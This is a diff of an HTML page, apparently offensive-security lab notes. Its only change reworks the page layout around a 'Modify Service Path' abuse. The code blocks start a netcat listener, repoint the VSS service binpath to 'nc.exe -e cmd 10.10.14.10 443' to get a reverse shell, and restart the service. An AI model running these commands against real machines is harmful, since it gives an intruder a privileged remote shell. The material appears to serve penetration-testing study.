@@ -198,15 +198,23 @@
 
 <div class="content"><hr>
 <h4 id="abuse-1-modify-service-path">Abuse #1. Modify Service Path</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a nc listener</span>
 </span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">443</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Assumed nc.exe is uploaded</span>
+</span></span></code></pre></div></div>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Assumed nc.exe is uploaded</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">config</span> <span class="n">VSS</span> <span class="n">binpath</span><span class="p">=</span><span class="s2">&#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Stop service</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">stop</span> <span class="n">VSS</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Start service</span>
 </span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="nb">start </span><span class="n">VSS</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
